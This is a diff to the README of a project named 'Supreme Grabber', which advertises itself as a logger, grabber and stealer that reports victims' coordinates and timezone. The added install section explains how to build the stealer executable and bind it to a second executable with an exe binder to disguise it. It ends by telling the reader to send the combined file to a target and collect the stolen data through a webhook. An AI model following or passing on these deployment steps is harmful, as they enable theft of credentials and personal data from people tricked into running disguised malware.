@@ -70,8 +70,24 @@ Currently the #1 logger/grabber/stealer in multiple top developers opinions if y
 * PROVIDES LONG & LAT 🌐
 * PROVIDES TIMEZONE ⏰
 # Install
+## Prerequisites
+
+-   Windows 10/11
+-   [Python](https://www.python.org/downloads/release/python-3109/)
+-   [Git](https://git-scm.com/download/win)
+
+### Setup
+
+1. [Download source code zip](https://github.com/real-fbdn/Supreme-Grabber/archive/refs/heads/main.zip)
+2. Extract zip
+3. Run `install_python.bat` if you don't have python installed
+4. Run the builder by double clicking the `build.bat` file
+5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
+6. In the `Viper` folder, run the builder which will have the installer and the exe builder, follow the instructions in the builder like last time and you have both of the exe files.
+7. Download a exe merger/joiner/binder like [this one](https://sourceforge.net/projects/exebinder/) and bind the 2 exe files together.
+8. Simply send to target the combined exe files and wait for the result in your webhook!
 # Contributing
-View the [contributing guidelines]() for more information on how you can help out.
+View the [contributing guidelines](https://github.com/real-fbdn/Supreme-Grabber/blob/main/CONTRIBUTING.md) for more information on how you can help out.
 # License
 Supreme Grabber is Licensed under the [MIT License](https://mit-license.org/).
 # Errors?
